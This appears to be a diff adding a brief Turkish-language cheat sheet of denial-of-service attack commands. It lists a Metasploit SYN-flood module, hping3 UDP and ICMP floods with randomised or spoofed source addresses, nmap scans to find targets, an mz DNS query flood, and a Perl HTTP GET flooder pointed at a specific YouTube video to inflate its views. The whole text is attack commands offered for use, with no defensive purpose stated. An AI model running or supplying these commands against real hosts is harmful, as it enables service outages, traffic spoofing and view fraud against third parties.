@@ -1,0 +1,38 @@
+Dos Atma
+
+use auxiliary/dos/tcp/synflood
+show options
+set RHOSTS ...
+exploit
+
+UDP Dos Saldýrýsý
+
+nmap ... -sU
+hping3 --udp ... -p 53 --flood --rand-source -E ....txt -d 55
+
+Port Arama
+nmap ... -sU -p 67
+
+Dos Ip Degistirme
+
+hping3
+-S saldýrýlcak ip --spoof görüncek ip
+
+Yapýlan Saldýrý Ýzleme
+WireShark -- Kendime
+tcpdump host ... -- Karþýya
+
+DNS Saldýrýsý
+
+apt -get install mz
+nmap -ST -sU ... -p 53/67
+mz -A rand -B ... -t "q=site id" -c 1000
+
+Http Get Flood Saldýrýsý - Youtube Bot Basma
+
+cd httpflooder
+perl httpflooder.pl -a GF -h youtube.com --url "/watch?v=LgFTlcMO2UE" -n 100
+
+Imcp Saldýrýsý
+
+hping3 --icmp ... -- flood --rand-source
